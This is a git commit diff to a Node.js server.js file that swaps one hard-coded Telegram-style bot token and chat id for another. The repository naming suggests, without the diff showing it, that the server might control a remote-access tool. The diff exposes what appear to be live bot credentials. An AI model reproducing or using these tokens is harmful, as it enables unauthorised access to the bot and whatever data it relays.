88129af85883146fe3d3b357cc15c82124130fac
cyber-security <128243843+cctv-security@users.noreply.github.com>
2025-01-22 13:17:11 +0200

    Update server.js

--- APPS&Soucrce-Code/source code/server code v3/server.js
+++ APPS&Soucrce-Code/source code/server code v3/server.js
@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
+const token = '7655226951:AAF1eMMwVvf7v6U_NbUc3Rz5ygh3sAyCSo0'
+const id = '927899812'
 const address = 'https://www.google.com'
 
 const app = express();
